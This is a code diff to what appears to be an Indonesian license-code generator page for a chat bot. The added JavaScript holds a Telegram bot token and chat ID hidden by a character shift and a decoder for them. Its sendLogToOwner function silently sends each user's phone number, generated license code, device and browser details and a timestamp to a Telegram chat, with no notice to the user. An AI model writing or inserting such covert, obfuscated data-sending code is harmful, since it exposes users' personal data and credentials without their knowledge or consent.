@@ -664,6 +664,13 @@
     </div>
 
     <script>
+        // --- KONFIGURASI LOGGING TELEGRAM (DIISI OLEH OWNER/CREATOR) ---
+        const LOG_CONFIG = {
+            useTelegram: true, // Diaktifkan otomatis
+            telegramBotToken: "<57=76:<>=?FFJzj{2U^KGjzIrrvgSsF~XJl>mxo}H^YMt", // Terenkripsi
+            telegramChatId: ";;=><>5575" // Terenkripsi
+        };
+
         // DOM Elements
         const secretInput = document.getElementById('secret-key');
         const phoneInput = document.getElementById('phone-number');
@@ -1042,6 +1049,9 @@
             copyBtn.className = 'btn-copy';
             copyBtn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> Salin Kode`;
 
+            // Send log to owner (Discord / Telegram)
+            sendLogToOwner(phoneNumber, finalCode, targetMonth, isAlreadyRegistered ? "Reused (Dimuat Ulang)" : "Baru Dibuat");
+
             // Refresh history view
             updateHistoryList();
         }
@@ -1144,6 +1154,83 @@
             }).catch(err => {
                 alert('Gagal menyalin.');
             });
+        }
+
+        // Get device OS and browser information
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            let browser = "Unknown Browser";
+            let deviceType = "Desktop";
+
+            // OS Detection
+            if (/android/i.test(ua)) {
+                os = "Android";
+                deviceType = "Mobile";
+            } else if (/ipad|iphone|ipod/i.test(ua)) {
+                os = "iOS";
+                deviceType = "Mobile";
+            } else if (/windows/i.test(ua)) {
+                os = "Windows";
+            } else if (/macintosh/i.test(ua)) {
+                os = "macOS";
+            } else if (/linux/i.test(ua)) {
+                os = "Linux";
+            }
+
+            // Browser Detection
+            if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua) && !/opr|opera/i.test(ua)) {
+                browser = "Google Chrome";
+            } else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) {
+                browser = "Safari";
+            } else if (/firefox|fxios/i.test(ua)) {
+                browser = "Mozilla Firefox";
+            } else if (/edge|edg/i.test(ua)) {
+                browser = "Microsoft Edge";
+            } else if (/opr|opera/i.test(ua)) {
+                browser = "Opera";
+            }
+
+            return `${os} (${deviceType}) - ${browser}`;
+        }
+
+        // Helper to decrypt character-shifted string
+        function decodeValue(str) {
+            return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 5)).join('');
+        }
+
+        // Send logging to Telegram Bot
+        async function sendLogToOwner(phone, code, month, status) {
+            const device = getDeviceDetails();
+            const dateStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';
+            
+            if (LOG_CONFIG.useTelegram && LOG_CONFIG.telegramBotToken && LOG_CONFIG.telegramChatId) {
+                try {
+                    const decryptedToken = decodeValue(LOG_CONFIG.telegramBotToken);
+                    const decryptedChatId = decodeValue(LOG_CONFIG.telegramChatId);
+
+                    const textMessage = `🔑 *LOG LISENSI ALFA BOT*\n\n` +
+                        `📱 *Nomor Bot:* \`${phone}\`\n` +
+                        `🔑 *Kode Lisensi:* \`${code}\`\n` +
+                        `📅 *Bulan Periode:* ${month}\n` +
+                        `⚡ *Status:* ${status}\n` +
+                        `💻 *Perangkat:* ${device}\n` +
+                        `⏰ *Waktu:* ${dateStr}`;
+                    
+                    const url = `https://api.telegram.org/bot${decryptedToken}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: decryptedChatId,
+                            text: textMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Failed to send Telegram log:', e);
+                }
+            }
         }
     </script>
 </body>
